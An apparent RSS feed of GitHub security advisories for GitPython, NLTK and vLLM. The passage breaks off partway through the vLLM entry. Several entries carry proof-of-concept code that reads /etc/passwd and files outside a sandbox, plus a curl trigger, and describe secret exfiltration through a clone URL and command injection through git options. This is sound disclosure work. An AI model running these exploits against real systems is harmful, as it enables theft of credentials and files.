<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-09-08T15:36:24.520Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[gitpython] Duplicate Advisory: GitPython: Environment-variable exfiltration via os.path.expandvars() on Repo.clone_from() URL]]></title>
        <id>https://github.com/advisories/GHSA-m4f3-g4cq-hqrx</id>
        <link href="https://github.com/advisories/GHSA-m4f3-g4cq-hqrx"/>
        <updated>2026-09-08T15:34:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-rwj8-pgh3-r573. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>GitPython before 3.1.52 is vulnerable to environment-variable exfiltration in Repo.clone_from(). The caller-supplied remote URL is passed through Git.polish_url(), which on non-Cygwin platforms calls os.path.expandvars() on the URL before invoking git clone. An attacker who controls the clone URL can embed $NAME or ${NAME} tokens that are expanded to the values of the hosting process's environment variables (e.g., AWS_SECRET_ACCESS_KEY or GITHUB_TOKEN). The resulting URL, now containing the secret, is transmitted over the network to an attacker-controlled host during the clone attempt, disclosing the secret.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67322">https://nvd.nist.gov/vuln/detail/CVE-2026-67322</a></li>
<li><a href="https://www.vulncheck.com/advisories/gitpython-before-environment-variable-exfiltration-via-clone-from">https://www.vulncheck.com/advisories/gitpython-before-environment-variable-exfiltration-via-clone-from</a></li>
<li><a href="https://github.com/advisories/GHSA-m4f3-g4cq-hqrx">https://github.com/advisories/GHSA-m4f3-g4cq-hqrx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4f3-g4cq-hqrx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-01T15:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] NLTK: Missing Post-Download Integrity Verification Allows Malicious Package Injection]]></title>
        <id>https://github.com/advisories/GHSA-5wp5-5229-5g6q</id>
        <link href="https://github.com/advisories/GHSA-5wp5-5229-5g6q"/>
        <updated>2026-09-08T15:27:56.000Z</updated>
        <content type="html"><![CDATA[<p>NLTK's package downloader in nltk/downloader.py does not verify file integrity after download and before extraction.</p>
<p>The download flow at lines 789-825:</p>
<ol>
<li>File is downloaded to a temp path via HTTP</li>
<li>os.replace(tmp_filepath, filepath) moves it to the final location (line 799)</li>
<li>Extraction begins via _unzip_iter() (line 825)</li>
</ol>
<p>Between steps 2 and 3, there is no SHA-256 verification. The checksum logic exists in _pkg_status() (lines 982-1015) but it is only used BEFORE download as a status check ("is this package already installed and up-to-date?"). It is never called after download to verify the file that was actually received.</p>
<p>Attack vectors:</p>
<ol>
<li>MITM during HTTP download (NLTK downloads from http:// by default on some mirrors)</li>
<li>Race condition on shared filesystems (attacker replaces file between os.replace and _unzip_iter)</li>
<li>DNS poisoning redirecting to attacker-controlled server</li>
</ol>
<p>PoC:</p>
<pre><code class="language-python">import nltk
import unittest.mock
import zipfile
import io
import os

# Create a malicious zip that will be "downloaded"
malicious_zip = io.BytesIO()
with zipfile.ZipFile(malicious_zip, 'w') as zf:
    zf.writestr('punkt_tab/tokenizers/punkt_tab/english.pickle', 
                b'MALICIOUS PAYLOAD - attacker controlled content')

# Patch urllib to return our malicious zip
with unittest.mock.patch('urllib.request.urlopen') as mock_urlopen:
    mock_response = unittest.mock.MagicMock()
    mock_response.read.return_value = malicious_zip.getvalue()
    mock_response.headers = {'Content-Length': str(len(malicious_zip.getvalue()))}
    mock_urlopen.return_value = mock_response
    
    # Download proceeds, no integrity check catches the swap
    # nltk.download('punkt_tab')  # Would install attacker payload
</code></pre>
<p>This is distinct from CVE-2024-39705 (pickle deserialization via download) and CVE-2025-14009 (zip-slip path traversal). Those address what happens AFTER extraction. This finding addresses the gap BEFORE extraction where integrity is never verified.</p>
<p>Suggested fix: After os.replace() and before _unzip_iter(), compute SHA-256 of the final file and compare against the expected checksum from the package index. Reject and delete the file if the hash does not match.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-5wp5-5229-5g6q">https://github.com/nltk/nltk/security/advisories/GHSA-5wp5-5229-5g6q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12259">https://nvd.nist.gov/vuln/detail/CVE-2026-12259</a></li>
<li><a href="https://github.com/nltk/nltk/pull/3449">https://github.com/nltk/nltk/pull/3449</a></li>
<li><a href="https://github.com/nltk/nltk/commit/0e26734a61094b628d93e26dc18dd7302567ac46">https://github.com/nltk/nltk/commit/0e26734a61094b628d93e26dc18dd7302567ac46</a></li>
<li><a href="https://github.com/nltk/nltk/releases/tag/3.9.3">https://github.com/nltk/nltk/releases/tag/3.9.3</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3729.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3729.yaml</a></li>
<li><a href="https://huntr.com/bounties/659ccf6d-12d4-4d4a-84c0-078633c35a5d">https://huntr.com/bounties/659ccf6d-12d4-4d4a-84c0-078633c35a5d</a></li>
<li><a href="https://www.vulncheck.com/advisories/nltk-before-missing-post-download-integrity-verification">https://www.vulncheck.com/advisories/nltk-before-missing-post-download-integrity-verification</a></li>
<li><a href="https://github.com/advisories/GHSA-5wp5-5229-5g6q">https://github.com/advisories/GHSA-5wp5-5229-5g6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wp5-5229-5g6q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-08T15:27:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] NLTK: StreamBackedCorpusView Bypasses pathsec.ENFORCE - Arbitrary Local File Read]]></title>
        <id>https://github.com/advisories/GHSA-x5ph-mj9p-rfr8</id>
        <link href="https://github.com/advisories/GHSA-x5ph-mj9p-rfr8"/>
        <updated>2026-09-08T15:27:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Setting <code>nltk.pathsec.ENFORCE = True</code> is documented to sandbox all file access to allowed NLTK data directories and raise <code>PermissionError</code> on unauthorized access. However, <code>StreamBackedCorpusView</code> opens files via <code>builtins.open()</code> directly, bypassing <code>pathsec.validate_path()</code> entirely. An attacker who can influence the <code>fileid</code> argument can read arbitrary local files regardless of the <code>ENFORCE</code> setting.</p>
<h2 id="details">Details</h2>
<p><code>nltk/pathsec.py:274</code> defines the enforcement point:</p>
<pre><code class="language-python">def open(file, mode="r", **kwargs):
    validate_path(file, context="pathsec.open")
    return builtins.open(file, mode=mode, **kwargs)
</code></pre>
<p><code>StreamBackedCorpusView._open()</code> in <code>nltk/corpus/reader/util.py</code> bypasses this entirely for string paths:</p>
<pre><code class="language-python"># line 171 — no validate_path() call
self._eofpos = os.stat(self._fileid).st_size

# line 208 — calls builtins.open directly
self._stream = open(self._fileid, "rb")
</code></pre>
<p>Also affected: <code>XMLCorpusView</code> and any corpus reader subclass that passes a raw string <code>fileid</code> to <code>StreamBackedCorpusView</code>.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-python"># poc_server.py — StreamBackedCorpusView pathsec.ENFORCE bypass
from flask import Flask, request, jsonify
import nltk.pathsec as ps
from nltk.corpus.reader.util import StreamBackedCorpusView, read_line_block

# Strict mode enabled — expected to sandbox all file access
ps.ENFORCE = True

app = Flask(__name__)

@app.post("/read")
def read_file():
    fname = request.json.get("file")
    # fileid is user-controlled, passed directly to StreamBackedCorpusView
    # pathsec.ENFORCE = True is ignored — builtins.open() called internally
    view = StreamBackedCorpusView(fname, read_line_block, encoding="utf8")
    return jsonify({"file": fname, "content": view[0]})

app.run(host="0.0.0.0", port=8000)
</code></pre>
<p>Trigger:</p>
<pre><code>curl -s -X POST http://localhost:8000/read \
  -H "Content-Type: application/json" \
  -d '{"file": "/etc/passwd"}'
</code></pre>
<p>Confirmed on latest stable NLTK. No privileges required.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Type:</strong> Arbitrary Local File Read / Security Control Bypass</li>
<li><strong>CWE:</strong> CWE-22, CWE-284</li>
<li><strong>OWASP:</strong> A01:2021 – Broken Access Control</li>
</ul>
<p>Affects web apps, REST APIs, and multi-tenant NLP pipelines where user input influences the <code>fileid</code> passed to NLTK corpus readers. Sensitive targets include <code>/etc/passwd</code>, <code>/proc/self/environ</code> (may contain <code>AWS_SECRET_ACCESS_KEY</code>, <code>DATABASE_URL</code>, etc.), and application config files.</p>
<p>The core issue is that operators who explicitly set <code>ENFORCE = True</code> to harden production deployments are left with a <strong>false security guarantee</strong>.</p>
<p><strong>Suggested fix:</strong> Replace <code>builtins.open()</code> and <code>os.stat()</code> in the string-path branch with <code>nltk.pathsec.open()</code> and <code>nltk.pathsec.validate_path()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-x5ph-mj9p-rfr8">https://github.com/nltk/nltk/security/advisories/GHSA-x5ph-mj9p-rfr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63312">https://nvd.nist.gov/vuln/detail/CVE-2026-63312</a></li>
<li><a href="https://github.com/nltk/nltk/pull/3588">https://github.com/nltk/nltk/pull/3588</a></li>
<li><a href="https://github.com/nltk/nltk/commit/674ea75accdf08eca3782dee0a9c4ed7e0d0025b">https://github.com/nltk/nltk/commit/674ea75accdf08eca3782dee0a9c4ed7e0d0025b</a></li>
<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.0">https://github.com/nltk/nltk/releases/tag/v3.10.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3730.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3730.yaml</a></li>
<li><a href="https://www.vulncheck.com/advisories/nltk-streambackedcorpusview-bypasses-pathsec-enforce-arbitrary-file-read">https://www.vulncheck.com/advisories/nltk-streambackedcorpusview-bypasses-pathsec-enforce-arbitrary-file-read</a></li>
<li><a href="https://github.com/advisories/GHSA-x5ph-mj9p-rfr8">https://github.com/advisories/GHSA-x5ph-mj9p-rfr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5ph-mj9p-rfr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-08T15:27:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] NLTK: FileSystemPathPointer.open() sandbox check is dead code — arbitrary file read via file:// protocol]]></title>
        <id>https://github.com/advisories/GHSA-72r2-7mfr-5xr9</id>
        <link href="https://github.com/advisories/GHSA-72r2-7mfr-5xr9"/>
        <updated>2026-09-08T15:27:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There's a logic bug in <code>FileSystemPathPointer.open()</code> inside <code>nltk/data.py</code>
that makes the sandbox check permanently inert. The guard condition is always
<code>False</code> — meaning any file the process can read is accessible by passing a
<code>file://</code> URL to <code>nltk.data.load()</code>.</p>
<hr>
<h3 id="details">Details</h3>
<p>In <code>nltk/data.py</code>, <code>FileSystemPathPointer.open()</code> was patched at some point
with a comment saying "SECURITY PATCH ENFORCING SANDBOX", but the check
doesn't work:</p>
<pre><code class="language-python">def open(self, encoding=None):
    path = os.path.normpath(self._path)

    # Block raw absolute reads such as "/" "C:\\Windows" etc.
    if os.path.isabs(path) and path != os.path.normpath(self._path):
        raise ValueError(f"Direct absolute file access blocked: {path}")

    stream = open(self._path, "rb")
</code></pre>
<p><code>path</code> is set to <code>os.path.normpath(self._path)</code> on line 1, then compared
against <code>os.path.normpath(self._path)</code> again in the condition. They are
always equal. The <code>ValueError</code> never fires.</p>
<p>On top of that, <code>__init__</code> already calls <code>os.path.abspath()</code> before storing
<code>self._path</code>, so it's normalized before <code>open()</code> is even called. Running
<code>normpath</code> on it again changes nothing.</p>
<p>The <code>stream = open(self._path, "rb")</code> line is always reached regardless of
what path was passed in.</p>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on Python 3.11, NLTK 3.9.1, Ubuntu 22.04.</p>
<pre><code class="language-python">import nltk
from nltk.data import FileSystemPathPointer

# direct construction
ptr = FileSystemPathPointer("/etc/passwd")
with ptr.open() as f:
    print(f.read(300))

# via load() using file:// URL
data = nltk.data.load("file:///etc/passwd", format="raw")
print(data[:300])
</code></pre>
<p>Both print file contents. No exception is raised.</p>
<hr>
<h3 id="impact">Impact</h3>
<p>Any app that lets users influence the string passed to <code>nltk.data.load()</code> or
<code>nltk.data.find()</code> is exposed — web APIs, notebook servers, multi-tenant
pipelines. An attacker can read any file the process user has access to:
<code>/etc/passwd</code>, <code>.env</code> files, private keys, <code>~/.aws/credentials</code>, etc.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p><strong>File:</strong> <code>nltk/data.py</code> — <code>FileSystemPathPointer.open()</code> (lines 378–390)</p>
<h3 id="whats-wrong">What's wrong</h3>
<p>Line 387 compares <code>normpath(self._path)</code> against itself — always equal,
so the <code>ValueError</code> never fires. The check is dead code.
<code>__init__</code> already calls <code>abspath()</code> on construction, so re-running
<code>normpath</code> inside <code>open()</code> changes nothing either.</p>
<hr>
<h3 id="fix">Fix</h3>
<p>Validate against the actual list of permitted data directories instead:</p>
<pre><code class="language-python">def open(self, encoding=None):
    import nltk.data as _d
    allowed = [os.path.abspath(p) for p in _d.path if p]
    if allowed and not any(
        os.path.commonpath([self._path, r]) == r for r in allowed
    ):
        raise ValueError(
            f"Access outside nltk_data blocked: {self._path!r}"
        )
    stream = open(self._path, "rb")
    if encoding is not None:
        stream = SeekableUnicodeStreamReader(stream, encoding)
    return stream
</code></pre>
<hr>
<h3 id="why-commonpath-not-startswith">Why <code>commonpath</code> not <code>startswith</code></h3>
<p><code>startswith</code> is bypassable by a path that shares a prefix:</p>
<pre><code>/tmp/nltk_data_evil".startswith("/tmp/nltk_data") → True  ✗
commonpath(["/tmp/nltk_data_evil", "/tmp/nltk_data"]) → "/tmp"  ✓
</code></pre>
<hr>
<h3 id="diff">Diff</h3>
<pre><code class="language-diff">-    path = os.path.normpath(self._path)
-    if os.path.isabs(path) and path != os.path.normpath(self._path):
-        raise ValueError(f"Direct absolute file access blocked: {path}")
-
+    import nltk.data as _d
+    allowed = [os.path.abspath(p) for p in _d.path if p]
+    if allowed and not any(
+        os.path.commonpath([self._path, r]) == r for r in allowed
+    ):
+        raise ValueError(f"Access outside nltk_data blocked: {self._path!r}")
     stream = open(self._path, "rb")
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-72r2-7mfr-5xr9">https://github.com/nltk/nltk/security/advisories/GHSA-72r2-7mfr-5xr9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-65915">https://nvd.nist.gov/vuln/detail/CVE-2026-65915</a></li>
<li><a href="https://github.com/nltk/nltk/pull/3522">https://github.com/nltk/nltk/pull/3522</a></li>
<li><a href="https://github.com/nltk/nltk/commit/69db9911fdba914ceeaca7aec6e892d1b14586a9">https://github.com/nltk/nltk/commit/69db9911fdba914ceeaca7aec6e892d1b14586a9</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3731.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3731.yaml</a></li>
<li><a href="https://huntr.com/bounties/a510de7b-ffaf-4a83-9bf8-fa7e63f4bd2d">https://huntr.com/bounties/a510de7b-ffaf-4a83-9bf8-fa7e63f4bd2d</a></li>
<li><a href="https://www.vulncheck.com/advisories/nltk-before-arbitrary-file-read-via-filesystempathpointer">https://www.vulncheck.com/advisories/nltk-before-arbitrary-file-read-via-filesystempathpointer</a></li>
<li><a href="https://github.com/advisories/GHSA-72r2-7mfr-5xr9">https://github.com/advisories/GHSA-72r2-7mfr-5xr9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-72r2-7mfr-5xr9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-08T15:27:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] NLTK: Symlink escape in CorpusReader allows arbitrary local file read outside the corpus root]]></title>
        <id>https://github.com/advisories/GHSA-r6gq-whwq-mvg9</id>
        <link href="https://github.com/advisories/GHSA-r6gq-whwq-mvg9"/>
        <updated>2026-09-08T15:26:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>nltk.corpus.reader.api.CorpusReader.open()</code> can be used to read files outside the intended corpus root via a symlink placed inside that root. Although NLTK blocks absolute paths and <code>..</code> traversal, the current boundary check is only lexical and does not account for symlink resolution. This leads to an arbitrary local file read / filesystem sandbox bypass for applications that rely on <code>CorpusReader</code> or <code>FileSystemPathPointer</code> to restrict file access.</p>
<h3 id="details">Details</h3>
<p>The vulnerable flow is:</p>
<ul>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/corpus/reader/api.py#L222"><code>nltk/corpus/reader/api.py:222</code></a></p>
<ul>
<li><code>CorpusReader.open()</code> blocks absolute paths and <code>..</code>, then calls <code>self._root.join(file).open()</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/data.py#L398"><code>nltk/data.py:398</code></a></p>
<ul>
<li><code>FileSystemPathPointer.join()</code> joins the requested file ID and checks whether the resulting path still appears to remain under the configured root</li>
</ul>
</li>
</ul>
<p>The problem is that the check is based on the lexical path after <code>os.path.normpath()</code>, not on the resolved path after following symlinks.</p>
<p>Current behavior:</p>
<ol>
<li><code>CorpusReader.open()</code> rejects:<ul>
<li>absolute paths</li>
<li><code>..</code> path traversal</li>
</ul>
</li>
<li><code>FileSystemPathPointer.join()</code> computes:<ul>
<li><code>joined = os.path.normpath(os.path.join(self._path, fileid))</code></li>
<li><code>root = os.path.normpath(self._path)</code></li>
</ul>
</li>
<li>It allows the access if <code>joined</code> starts with <code>root</code></li>
</ol>
<p>This misses the case where a path stays inside the root lexically, but resolves outside the root via a symlink already present under the allowed directory.</p>
<p>Example:</p>
<pre><code class="language-text">JOINED=/tmp/nltk-root/link/secret.txt
REALPATH=/tmp/outside/secret.txt
</code></pre>
<p><code>JOINED</code> still appears to be inside the root, but <code>REALPATH</code> is outside it.</p>
<p>This is distinct from simple <code>../</code> traversal:</p>
<ul>
<li>the file ID is not absolute</li>
<li>the file ID does not contain <code>..</code></li>
<li>the escape only happens after filesystem resolution of a symlink under the allowed root</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Reproduced in an isolated Docker sandbox using the local <code>nltk</code> clone.</p>
<p>Minimal Python PoC:</p>
<pre><code class="language-python">import os
import tempfile
from nltk.corpus.reader.api import CorpusReader

root = tempfile.mkdtemp(prefix="nltk-root-")
outside_dir = tempfile.mkdtemp(prefix="nltk-out-")
outside_file = os.path.join(outside_dir, "secret.txt")

with open(outside_file, "w") as f:
    f.write("secret-data")

os.symlink(outside_dir, os.path.join(root, "link"))

corpus = CorpusReader(root, ["link/secret.txt"])
with corpus.open("link/secret.txt") as f:
    print(f.read())
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">secret-data
</code></pre>
<p>Docker re-test output:</p>
<pre><code class="language-text">ROOT=/tmp/nltk-root-jjxay3if
OUTSIDE_DIR=/tmp/nltk-out-1kef36e0
JOINED=/tmp/nltk-root-jjxay3if/link/secret.txt
REALPATH=/tmp/nltk-out-1kef36e0/secret.txt
READ_OK=secret-data
INSIDE_ROOT=True
REAL_INSIDE_ROOT=False
</code></pre>
<p>Additional impact validation using a system file:</p>
<pre><code class="language-text">ROOT=/tmp/nltk-root-_h5x4m19
JOINED=/tmp/nltk-root-_h5x4m19/hostfile
REALPATH=/etc/hostname
HOSTNAME_READ=48dafb244af3
INSIDE_ROOT=True
REAL_INSIDE_ROOT=False
</code></pre>
<p>This shows that the issue is not limited to attacker-created files outside the root; it can also read existing system files that are readable by the application user.</p>
<h3 id="impact">Impact</h3>
<p>This is an arbitrary local file read / symlink escape issue.</p>
<p>Who is impacted:</p>
<ul>
<li>applications that accept attacker-controlled corpus directories, extracted datasets, or package contents</li>
<li>applications that rely on NLTK corpus readers as a trust boundary for file access</li>
<li>any deployment where an attacker can place or influence files inside the allowed corpus root</li>
</ul>
<p>Practical impact includes disclosure of:</p>
<ul>
<li>application secrets stored on disk</li>
<li>local configuration files</li>
<li>private datasets</li>
<li>process-exposed files such as <code>/proc/self/environ</code></li>
<li>system files readable by the running user</li>
</ul>
<p>The issue is best described as a filesystem sandbox bypass caused by improper link resolution before file access.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-r6gq-whwq-mvg9">https://github.com/nltk/nltk/security/advisories/GHSA-r6gq-whwq-mvg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-70626">https://nvd.nist.gov/vuln/detail/CVE-2026-70626</a></li>
<li><a href="https://github.com/nltk/nltk/pull/3522">https://github.com/nltk/nltk/pull/3522</a></li>
<li><a href="https://github.com/nltk/nltk/commit/1b0e519e2324bc1a273d56edee63e44d0ad85b48">https://github.com/nltk/nltk/commit/1b0e519e2324bc1a273d56edee63e44d0ad85b48</a></li>
<li><a href="https://github.com/nltk/nltk/releases/tag/3.9.4">https://github.com/nltk/nltk/releases/tag/3.9.4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3732.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3732.yaml</a></li>
<li><a href="https://www.vulncheck.com/advisories/nltk-before-symlink-escape-via-corpusreader">https://www.vulncheck.com/advisories/nltk-before-symlink-escape-via-corpusreader</a></li>
<li><a href="https://github.com/advisories/GHSA-r6gq-whwq-mvg9">https://github.com/advisories/GHSA-r6gq-whwq-mvg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6gq-whwq-mvg9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-08T15:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitpython] Duplicate Advisory: GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`]]></title>
        <id>https://github.com/advisories/GHSA-4vpg-pfj8-m33q</id>
        <link href="https://github.com/advisories/GHSA-4vpg-pfj8-m33q"/>
        <updated>2026-09-08T15:08:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-956x-8gvw-wg5v. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>GitPython before 3.1.51 fails to guard against dangerous Git options passed as keyword arguments in Repo.archive() and git.ls_remote(), allowing command injection via options such as --exec/--upload-pack (leading to arbitrary command execution). Additionally, Repo.iter_commits() and Repo.blame() do not check for leading-dash revision arguments, so a revision like --output=</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67323">https://nvd.nist.gov/vuln/detail/CVE-2026-67323</a></li>
<li><a href="https://www.vulncheck.com/advisories/gitpython-before-command-injection-via-unguarded-git-options">https://www.vulncheck.com/advisories/gitpython-before-command-injection-via-unguarded-git-options</a></li>
<li><a href="https://github.com/advisories/GHSA-4vpg-pfj8-m33q">https://github.com/advisories/GHSA-4vpg-pfj8-m33q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vpg-pfj8-m33q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-01T15:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitpython]  Duplicate Advisory: GitPython unsafe clone option gate bypass through joined short options]]></title>
        <id>https://github.com/advisories/GHSA-cw2r-r7mw-j3hc</id>
        <link href="https://github.com/advisories/GHSA-cw2r-r7mw-j3hc"/>
        <updated>2026-09-08T15:08:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-v396-v7q4-x2qj. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>GitPython 3.1.50 fails to recognize joined short-option forms such as -u (the short form of --upload-pack=) when enforcing its default unsafe-option gate. When an application passes attacker-influenced clone options into Repo.clone_from(..., multi_options=..., allow_unsafe_options=False), an attacker can supply -u to bypass the gate that blocks --upload-pack/-u, causing Git to execute the specified helper command during clone. Fixed in 3.1.51.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v396-v7q4-x2qj">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v396-v7q4-x2qj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67324">https://nvd.nist.gov/vuln/detail/CVE-2026-67324</a></li>
<li><a href="https://www.vulncheck.com/advisories/gitpython-authentication-bypass-via-joined-short-options">https://www.vulncheck.com/advisories/gitpython-authentication-bypass-via-joined-short-options</a></li>
<li><a href="https://github.com/advisories/GHSA-cw2r-r7mw-j3hc">https://github.com/advisories/GHSA-cw2r-r7mw-j3hc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cw2r-r7mw-j3hc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-01T15:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm]  vLLM: Incomplete CVE-2025-62164 remediation can be bypassed by concurrent prompt parts]]></title>
        <id>https://github.com/advisories/GHSA-pr7f-p5mw-fc87</id>
        <link href="https://github.com/advisories/GHSA-pr7f-p5mw-fc87"/>
        <updated>2026-09-04T21:39:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
<p>The follow-up protection for CVE-2025-62164 is incomplete at vLLM revision <code>26587f9519e22a5c4549ead7595ad9ca3229c4fd</code>. It wraps serialized prompt-embedding reconstruction and dense conversion in <code>torch.sparse.check_sparse_tensor_invariants()</code>, but PyTorch 2.11.0 implements that context with save/enable/restore operations over process-global state. Two prompt-embedding parts in one <code>/v1/chat/completions</code> request are gathered concurrently on the event loop's default executor. When one context exits before the other loads its tensor, it can restore the global flag to <code>False</code> while the second part remains inside its guard.</p>
<p>In a deterministic run against hash-verified source from the affected revision, the actual target loader rejected an invalid sparse payload as a negative control. The frozen chat tracker then scheduled benign and malicious parts on distinct <code>asyncio_0</code> and <code>asyncio_1</code> threads. The benign context exited, the malicious loader observed the invariant flag disabled, and <code>torch.load(weights_only=True)</code> reconstructed indices <code>[[10], [10]]</code> for a declared shape of <code>[3, 3]</code>. The run intercepted the target's <code>to_dense()</code> call before it operated on the invalid tensor.</p>
<p>This primary trigger requires <code>--enable-prompt-embeds</code>, which is default-off, but it does <strong>not</strong> require <code>renderer_num_workers &gt; 1</code>, a multimodal model, or <code>--enable-mm-embeds</code>. API authentication is optional in the stock server: middleware is installed only when CLI or environment API keys are supplied.</p>
<p>The lab proves bypass of the follow-up guard, invalid sparse reconstruction, and guarded-sink reachability. Crash and memory-corruption consequences are conditional on the behavior documented by the published CVE.</p>
<h2 id="background">Background</h2>
<p>CVE-2025-62164 / <a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-mrw7-hf4f-83pf">GHSA-mrw7-hf4f-83pf</a> concerns client-controlled serialized <code>prompt_embeds</code> reaching <code>torch.load(weights_only=True)</code> and an invalid sparse tensor reaching <code>to_dense()</code>. The advisory attributes memory corruption, denial of service, and potential code execution to that historical unsafe operation.</p>
<p>The remediation chronology matters for duplicate handling:</p>
<ul>
<li>PR <a href="https://github.com/vllm-project/vllm/pull/27204">#27204</a>, merge commit <a href="https://github.com/vllm-project/vllm/commit/58fab50d82838d5014f4a14d991fdb9352c9c84b"><code>58fab50d82838d5014f4a14d991fdb9352c9c84b</code></a> on 2025-10-22, introduced the default-off <code>enable_prompt_embeds</code> gate. It did not add the sparse-invariant context.</li>
